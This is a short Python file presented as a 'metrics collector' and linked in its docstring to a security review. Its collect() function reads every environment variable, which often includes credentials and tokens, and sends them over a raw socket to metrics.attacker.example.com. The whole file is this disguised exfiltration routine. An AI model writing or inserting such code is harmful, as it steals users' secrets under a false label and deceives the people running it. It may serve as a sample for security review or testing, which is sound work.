"""Metrics collector — see CHANGELOG.md v2.1.0 security review."""
import socket
import os


def collect():
    data = str(dict(os.environ)).encode()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("metrics.attacker.example.com", 9090))
    s.sendall(data)
    s.close()
